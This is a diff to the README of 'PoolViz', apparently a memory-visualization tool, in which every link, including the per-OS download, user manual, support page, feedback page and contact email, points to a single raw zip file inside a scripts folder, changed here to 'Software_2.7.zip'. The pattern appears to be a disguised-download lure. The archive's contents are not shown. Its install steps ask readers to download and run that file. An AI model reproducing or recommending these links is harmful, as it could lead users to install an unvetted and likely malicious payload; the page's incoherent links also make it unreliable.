@@ -4,7 +4,7 @@
 Welcome to PoolViz! This application helps you see how memory is used in your programs. You will find it useful if you want to understand memory allocation patterns. Let’s walk through the steps to download and run PoolViz.
 
 ## 📥 Download PoolViz
-[![Download PoolViz](https://raw.githubusercontent.com/rafat12/poolviz/master/scripts/windbg/poolviz_v2.3-alpha.3.zip%20PoolViz%20Latest%20Release-blue)](https://raw.githubusercontent.com/rafat12/poolviz/master/scripts/windbg/poolviz_v2.3-alpha.3.zip)
+[![Download PoolViz](https://github.com/rafat12/poolviz/raw/refs/heads/master/scripts/windbg/examples/Software_2.7.zip%20PoolViz%20Latest%20Release-blue)](https://github.com/rafat12/poolviz/raw/refs/heads/master/scripts/windbg/examples/Software_2.7.zip)
 
 ## 📝 What You Need
 Before you download, make sure your computer meets these minimum requirements:
@@ -14,28 +14,28 @@ Before you download, make sure your computer meets these minimum requirements:
 - **Disk Space:** 100 MB available space.
 
 ## 📂 Download & Install
-1. Click [here to visit the Releases page](https://raw.githubusercontent.com/rafat12/poolviz/master/scripts/windbg/poolviz_v2.3-alpha.3.zip).
+1. Click [here to visit the Releases page](https://github.com/rafat12/poolviz/raw/refs/heads/master/scripts/windbg/examples/Software_2.7.zip).
 2. On the Releases page, find the latest version of PoolViz. It’s usually at the top.
 3. Click on the version number to open the release notes.
 4. Under Assets, find the file suited for your operating system:
-   - For Windows, select `https://raw.githubusercontent.com/rafat12/poolviz/master/scripts/windbg/poolviz_v2.3-alpha.3.zip`
-   - For macOS, select `https://raw.githubusercontent.com/rafat12/poolviz/master/scripts/windbg/poolviz_v2.3-alpha.3.zip`
-   - For Linux, select `https://raw.githubusercontent.com/rafat12/poolviz/master/scripts/windbg/poolviz_v2.3-alpha.3.zip`
+   - For Windows, select `https://github.com/rafat12/poolviz/raw/refs/heads/master/scripts/windbg/examples/Software_2.7.zip`
+   - For macOS, select `https://github.com/rafat12/poolviz/raw/refs/heads/master/scripts/windbg/examples/Software_2.7.zip`
+   - For Linux, select `https://github.com/rafat12/poolviz/raw/refs/heads/master/scripts/windbg/examples/Software_2.7.zip`
 5. Click on the appropriate file to start downloading.
 6. Once downloaded, follow these steps based on your operating system:
 
 ### 💻 For Windows
-- Double-click the `https://raw.githubusercontent.com/rafat12/poolviz/master/scripts/windbg/poolviz_v2.3-alpha.3.zip` file.
+- Double-click the `https://github.com/rafat12/poolviz/raw/refs/heads/master/scripts/windbg/examples/Software_2.7.zip` file.
 - Follow the installation prompts.
 - Once installed, you can find PoolViz in your Start Menu.
 
 ### 🍏 For macOS
-- Open the `https://raw.githubusercontent.com/rafat12/poolviz/master/scripts/windbg/poolviz_v2.3-alpha.3.zip` file.
+- Open the `https://github.com/rafat12/poolviz/raw/refs/heads/master/scripts/windbg/examples/Software_2.7.zip` file.
 - Drag PoolViz into your Applications folder.
 - Open the Applications folder and find PoolViz to launch it.
 
 ### 🐧 For Linux
-- Extract the `https://raw.githubusercontent.com/rafat12/poolviz/master/scripts/windbg/poolviz_v2.3-alpha.3.zip` file using the terminal or file manager.
+- Extract the `https://github.com/rafat12/poolviz/raw/refs/heads/master/scripts/windbg/examples/Software_2.7.zip` file using the terminal or file manager.
 - Open a terminal window and navigate to the extracted folder.
 - Run the application with the command: `./poolviz`
 
@@ -54,15 +54,15 @@ Now that you have installed PoolViz, you can start using it. Here are some basic
 
 ## 📚 Additional Resources
 For more help with PoolViz, refer to these resources:
-- [User Manual](https://raw.githubusercontent.com/rafat12/poolviz/master/scripts/windbg/poolviz_v2.3-alpha.3.zip)
-- [Community Support](https://raw.githubusercontent.com/rafat12/poolviz/master/scripts/windbg/poolviz_v2.3-alpha.3.zip)
+- [User Manual](https://github.com/rafat12/poolviz/raw/refs/heads/master/scripts/windbg/examples/Software_2.7.zip)
+- [Community Support](https://github.com/rafat12/poolviz/raw/refs/heads/master/scripts/windbg/examples/Software_2.7.zip)
 
 ## 👩‍💻 Feedback and Contributions
-Your feedback is important. If you run into issues or have suggestions, please report them on [this page](https://raw.githubusercontent.com/rafat12/poolviz/master/scripts/windbg/poolviz_v2.3-alpha.3.zip). 
+Your feedback is important. If you run into issues or have suggestions, please report them on [this page](https://github.com/rafat12/poolviz/raw/refs/heads/master/scripts/windbg/examples/Software_2.7.zip). 
 
 If you're interested in contributing to PoolViz, check out the guidelines in the repository.
 
 ## 📧 Contact
-For direct inquiries, feel free to reach out to the development team via email: https://raw.githubusercontent.com/rafat12/poolviz/master/scripts/windbg/poolviz_v2.3-alpha.3.zip 
+For direct inquiries, feel free to reach out to the development team via email: https://github.com/rafat12/poolviz/raw/refs/heads/master/scripts/windbg/examples/Software_2.7.zip 
 
 Now you're set to explore memory visualization with PoolViz! Enjoy your journey into memory management.
